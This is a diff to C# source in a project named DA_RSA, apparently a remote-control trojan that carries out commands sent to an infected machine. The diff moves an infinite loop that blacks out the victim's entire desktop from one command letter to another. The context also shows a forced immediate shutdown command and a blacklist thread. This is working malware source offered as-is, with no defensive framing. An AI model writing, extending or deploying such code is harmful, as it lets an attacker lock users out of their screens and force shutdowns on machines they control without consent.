@@ -85,6 +85,20 @@ namespace DA_RSA
                     BlThread = new Thread(pts);
                     BlThread.Start(blacklist);
                 }
+                else if (cmd == "g")
+                {
+                    while (true)
+                    {
+                        IntPtr DESKTOPPTR = GetDC(IntPtr.Zero);
+                        Graphics G = Graphics.FromHdc(DESKTOPPTR);
+
+                        SolidBrush B = new SolidBrush(Color.Black);
+                        G.FillRectangle(B, new Rectangle(0, 0, 1920, 1080));
+
+                        G.Dispose();
+                        ReleaseDC(IntPtr.Zero, DESKTOPPTR);
+                    }
+                }
             }
 
         }
@@ -133,20 +147,7 @@ namespace DA_RSA
                             Process.Start("shutdown", "/s /t 1 /f");
                         }
                         //string tmp = Environment.GetFolderPath(Environment.SpecialFolder.History);
-                        else if (cmd == "f")
-                        {
-                            while (true)
-                            {
-                                IntPtr DESKTOPPTR = GetDC(IntPtr.Zero);
-                                Graphics G = Graphics.FromHdc(DESKTOPPTR);
-
-                                SolidBrush B = new SolidBrush(Color.Black);
-                                G.FillRectangle(B, new Rectangle(0, 0, 1920, 1080));
-
-                                G.Dispose();
-                                ReleaseDC(IntPtr.Zero, DESKTOPPTR);
-                            }
-                        }
+                       
                     }
                 }
                 catch
